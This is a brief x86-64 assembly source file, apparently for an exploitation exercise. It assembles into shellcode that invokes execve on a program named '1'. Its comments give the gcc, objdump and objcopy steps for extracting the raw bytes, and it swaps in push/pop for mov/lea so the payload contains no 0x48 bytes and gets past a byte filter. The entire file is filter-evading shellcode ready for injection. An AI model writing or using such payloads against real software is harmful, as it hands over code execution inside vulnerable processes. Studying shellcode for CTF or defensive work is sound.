# build with gcc -nostdlib -static testshell.s -o testshell-elf
# objdump -M intel -d testshell-elf
# get shellcode with objcopy --dump-section .text=shellcode-raw testshell-elf

# shellcode cant have \x48 bytes
# mov and lea generate \x48 bytes
# using push to put the value on the stack and using pop to send the value to the register

.global _start
_start:
.intel_syntax noprefix
main:
	pop rdi # first argument for execve is the name of the executable, getting from the stack

	push 0
	pop rsi # second argument to execve, argv, NULL. 

	push 0
	pop rdx # third argument to execve, envp, NULL

	push 59 # syscall execve
	pop rax

	syscall # callllinnnngggg

executable:
   call main # calling from here will put the .string address on the stack as ret address
	.string "1" # executable path/name whatever
